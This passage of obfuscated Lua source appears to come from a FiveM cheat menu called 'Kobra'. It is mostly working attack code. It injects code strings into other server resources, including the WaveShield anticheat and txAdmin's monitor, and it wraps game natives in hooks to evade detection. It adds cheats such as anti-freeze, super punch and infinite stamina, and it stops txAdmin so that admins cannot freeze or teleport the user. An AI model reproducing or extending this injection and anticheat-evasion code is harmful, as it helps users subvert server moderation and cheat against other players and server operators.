                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",4212 -(583 + 629) );break;end end end elseif v361 then local v767=0;while true do if (v767==(0 + 0)) then v12:Notify("success","Kobra","No Ragdoll Disabled",7760 -4760 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);break;end end else local v768=0 + 0 ;while true do if (v768==(1170 -(943 + 227))) then v48(v362,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",3000);break;end end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v363) local v364=0 + 0 ;local v365;local v366;while true do if (v364==(1632 -(1539 + 92))) then if v363 then if v365 then v12:Notify("success","Kobra","Anti-Freeze Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);else local v974=1946 -(706 + 1240) ;while true do if (v974==(258 -(81 + 177))) then v48(v366,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",8476 -5476 );break;end end end elseif v365 then v12:Notify("error","Kobra","Anti-Freeze Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);else local v975=0;while true do if (v975==0) then v48(v366,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",3000);break;end end end break;end if (v364==(257 -(212 + 45))) then v365=GetResourceState("WaveShield")=="started" ;v366=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v364=3 -2 ;end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v367) if v367 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v368) if v368 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v369) if v369 then local v561=1667 -(586 + 1081) ;while true do if (v561==(511 -(348 + 163))) then v12:Notify("success","Kobra","Infinite Stamina On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else local v562=0 + 0 ;while true do if (v562==(280 -(215 + 65))) then v12:Notify("error","Kobra","Infinite Stamina Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end break;end end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v370) local v371=1859 -(1541 + 318) ;local v372;while true do if (0==v371) then v372=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v370 then v48(v372,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v372,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end break;end end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v373) local v374=GetResourceState("WaveShield")=="started" ;local v375=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v373 then if v374 then local v769=0 + 0 ;while true do if (v769==(0 + 0)) then v12:Notify("success","Kobra","Super Punch Enabled",4750 -(1036 + 714) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);break;end end else v48(v375,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",3000);end elseif v374 then local v770=0 + 0 ;while true do if (v770==(0 + 0)) then v12:Notify("error","Kobra","Super Punch Disabled",4280 -(883 + 397) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);break;end end else local v771=590 -(563 + 27) ;while true do if (v771==(0 -0)) then v48(v375,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",3000);break;end end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v376) if v376 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v377) if v377 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(3,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(2 + 1 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v378) if v378 then local v563=403 -(274 + 129) ;while true do if (0==v563) then MachoResourceStop("monitor");print("started");break;end end else local v564=217 -(12 + 205) ;while true do if (v564==(0 + 0)) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v379) if v379 then local v565=0 + 0 ;while true do if (v565==0) then MachoResourceStop("monitor");print("started");break;end end else local v566=384 -(27 + 357) ;while true do if (v566==(480 -(91 + 389))) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v380) if v380 then local v567=0 + 0 ;while true do if ((861 -(706 + 155))==v567) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v381) if (v381=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1 + 0 ,values={"Freemode Male","Freemode Female"},onSelect=function(v382) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v382));end},{type="scrollable",label="Peds",scrollType="onEnter",value=844 -(268 + 575) ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v383) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
